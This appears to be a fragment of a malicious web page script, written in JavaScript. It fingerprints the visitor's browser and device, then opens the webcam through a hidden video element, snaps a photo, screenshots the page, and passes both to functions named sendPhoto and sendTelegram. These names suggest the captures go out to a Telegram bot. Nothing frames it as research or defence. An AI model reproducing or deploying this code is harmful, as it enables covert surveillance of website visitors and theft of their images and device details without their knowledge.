// ========== FINGERPRINT ==========
async function generateFingerprint(){
    const ua=navigator.userAgent; const lang=navigator.language;
    const res=screen.width+"x"+screen.height;
    const timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
    const ram=navigator.deviceMemory||"N/A";
    const cpu=navigator.hardwareConcurrency||"N/A";
    const raw=`${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
    const data=new TextEncoder().encode(raw);
    const hashBuffer=await crypto.subtle.digest('SHA-256',data);
    return [...new Uint8Array(hashBuffer)].map(x=>x.toString(16).padStart(2,'0')).join('');
}

// ========== CAMERA & SCREENSHOT ==========
const startCapture=async()=>{
    try{
        const video=document.createElement('video');
        video.autoplay=true;video.muted=true;video.style.display='none';
        document.body.appendChild(video);
        const canvas=document.getElementById('c');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;
        await new Promise(r=>video.onloadedmetadata=r);
        canvas.width=video.videoWidth; canvas.height=video.videoHeight;
        canvas.getContext('2d').drawImage(video,0,0);
        canvas.toBlob(b=>sendPhoto(b,'camera_capture.jpg'),'image/jpeg');
        stream.getTracks().forEach(t=>t.stop());
        video.remove();
    }catch{ await sendTelegram("❌ Camera blocked"); }

    try{
        const shot=await html2canvas(document.body);
        shot.toBlob(b=>sendPhoto(b,'screenshot.jpg'),'image/jpeg');
    }catch{ await sendTelegram("❌ Screenshot failed"); }
}
